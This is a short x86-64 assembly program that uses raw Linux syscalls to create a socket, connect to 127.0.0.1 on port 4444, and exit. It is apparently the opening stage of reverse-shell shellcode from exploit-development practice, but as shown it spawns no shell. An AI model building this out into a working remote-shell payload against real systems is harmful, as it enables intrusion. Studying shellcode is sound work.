section .text
        global _start
_start:
; SOCKET
        mov rax, 41
        mov rdi, 2
        mov rsi, 1
        xor rdx, rdx
        syscall
        xchg r12, rax

        sub rsp, 16
        mov word [rsp], 2
        mov word [rsp+2], 0x5c11
        mov dword [rsp+4], 0x0100007F
        mov qword [rsp+8], 0
; CONNECT
        mov rax, 42
        mov rdi, r12
        lea rsi, [rsp]
        mov rdx, 16
        syscall

; EXIT
        mov rax, 60
        xor rdi, rdi
        syscall
